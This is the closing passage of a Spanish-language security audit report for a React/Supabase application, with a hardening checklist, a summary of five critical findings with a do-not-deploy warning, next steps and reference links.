  - [ ] Audit logging habilitado
  - [ ] Limpiar logs de información sensible

- [ ] **Dependencias**
  - [ ] npm audit sin vulnerabilidades críticas
  - [ ] Versiones locked en package-lock.json
  - [ ] Dependencias mínimas necesarias
  - [ ] Remover dependencias innecesarias

- [ ] **Testing**
  - [ ] Pruebas de autenticación
  - [ ] Pruebas de autorización (RLS)
  - [ ] Pruebas de validación
  - [ ] OWASP Top 10 checklist

---

## 📞 CONTACTO Y ESCALADO

**Severidad CRÍTICA encontrada:** 5 vulnerabilidades  
**Tiempo estimado de remediación:** 15-20 horas  
**Riesgo actual:** Muy Alto - NO PUBLICA EN PRODUCCIÓN  

### Siguientes pasos:
1. Implementar correcciones Fase 1
2. Realizar testing de seguridad
3. Code review con especialista en seguridad
4. Deploy gradual con monitoreo

---

## 📚 REFERENCIAS

- [OWASP Top 10 2024](https://owasp.org/Top10/)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/database/postgres/row-level-security)
- [React Security](https://react.dev/learn#security)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CVSS v3.1 Specification](https://www.first.org/cvss/v3.1/specification-document)

---

**Reporte generado:** May 12, 2026  
**Clasificación:** Confidencial - Uso Interno
